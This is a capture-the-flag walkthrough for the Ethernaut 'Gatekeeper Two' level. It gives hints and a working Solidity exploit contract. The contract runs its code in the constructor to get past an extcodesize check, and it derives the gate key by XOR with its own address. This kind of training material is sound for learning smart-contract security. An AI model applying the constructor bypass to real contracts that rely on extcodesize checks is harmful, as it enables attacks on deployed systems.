# 14 - Gatekeeper Two

### Hints

<details>

<summary>Hint One</summary>

This challenge’s `gateTwo` modifier checks that the code size of the calling contract is 0. Clearly, there must be a trick to this as you won’t be able to solve the level with a contract that contains no code! Is this `extcodesize` function truly foolproof? Is there maybe some point in the contract’s lifecycle in which this check may not work as expected?

</details>

<details>

<summary>Hint Two</summary>

You can pass the `gateTwo` modifier by executing all of your contract’s code within its constructor. The `gateThree` modifier looks a bit more challenging:

`require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);`

Two things to keep in mind when determining how to calculate your `_gateKey`:

* Which values in the require statement above do you actually control?

<!---->

* The XOR (^) operation has the following property: A ^ B = C A ^ C = B

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier

pragma solidity 0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoExploit {
    /**
     * Constructor calculates the `gateKey` using the property of XOR:
     *
     * A ^ B = C
     * A ^ C = B
     *
     * Constructor then calls the 'GatekeeperTwo' contract's `enter` function
     * with the `gateKey`. As this code is being run in the constructor, the
     * `extcodesize` check of the caller will equal 0.
     */
    constructor(address gateKeeperContractAddress) public {
        uint64 gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ (uint64(0) - 1);

        IGatekeeperTwo(gateKeeperContractAddress).enter(bytes8(gateKey));
    }
}
```
